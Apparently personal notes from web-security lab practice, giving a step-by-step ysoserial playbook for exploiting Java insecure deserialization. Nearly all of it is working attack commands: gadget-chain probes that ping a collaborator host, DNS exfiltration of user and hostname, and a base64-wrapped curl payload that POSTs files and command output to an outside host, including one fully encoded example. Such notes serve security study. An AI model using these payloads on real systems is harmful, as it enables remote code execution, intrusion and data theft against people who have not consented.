# **Insecure Deserialization Notes**

---

## **Phase 1: Blind Detection (Universal DNS Check)**

**Description:** Run first to confirm the application is actually deserializing Java objects without relying on specific third-party library chains.

### Command:
```bash
ysoserial URLDNS "http://test.YOUR-COLLAB.oastify.com"
```

---

## **Phase 2: Gadget Chain Discovery (DNS Ping-Backs with Tags)**

**Description:** Spray common chains with unique subdomain tags to find which library exists on the target classpath.

### 2.1 Commons Collections 4.x Check
```bash
ysoserial CommonsCollections4 "nslookup cc4.YOUR-COLLAB.oastify.com"
```

### 2.2 Commons Collections 3.x Check
```bash
ysoserial CommonsCollections6 "nslookup cc6.YOUR-COLLAB.oastify.com"
```

### 2.3 Commons BeanUtils Check
```bash
ysoserial CommonsBeanutils1 "nslookup cb1.YOUR-COLLAB.oastify.com"
```

---

## **Phase 3: Dynamic Data Exfiltration via DNS (Single Tokens)**

**Description:** Exfiltrate system details using double quotes and escaped $IFS.

### 3.1 Exfiltrate Current User
```bash
ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`whoami\`.YOUR-COLLAB.oastify.com"
```

### 3.2 Exfiltrate Hostname
```bash
ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`hostname\`.YOUR-COLLAB.oastify.com"
```

### 3.3 Exfiltrate Both (User & Hostname)
```bash
ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`whoami\`.\`hostname\`.YOUR-COLLAB.oastify.com"
```

---

## **Phase 4: Full Multi-Line & File Exfiltration (Base64 Wrapper via HTTP POST)**

**Description:** Use the 2-step Base64 wrapper to handle spaces, quotes, newlines, and binary files without breaking Java's command tokenizer.

### Step 1: Encode your intended shell command locally

**Reading files:**
```bash
echo -n 'curl -d @/path/to/file http://YOUR-COLLAB.oastify.com' | base64
```

**Capturing full command output (e.g., directory listing):**
```bash
echo -n 'curl -d "$(ls -la /home/carlos)" http://YOUR-COLLAB.oastify.com' | base64
```

### Step 2: Feed the Base64 string into ysoserial
```bash
ysoserial CommonsCollections4 "sh -c echo\${IFS}<YOUR_BASE64_STRING>\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh"
example of a full fledged command
ysoserial CommonsCollections4 "sh -c echo\${IFS}Y3VybCAtZCBAL2hvbWUvY2FybG9zL21vcmFsZS50eHQgaHR0cDovL3M5MmR2c3NoenI2aDNwYWY4azNqdzduNHp2NW10bWhiLm9hc3RpZnkuY29t\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh
```

### Step 3: Read the data in Burp Collaborator
- Filter for HTTP interactions
- Click the incoming interaction
- Open "Request to Collaborator"
- View the exfiltrated contents inside the raw POST body

---
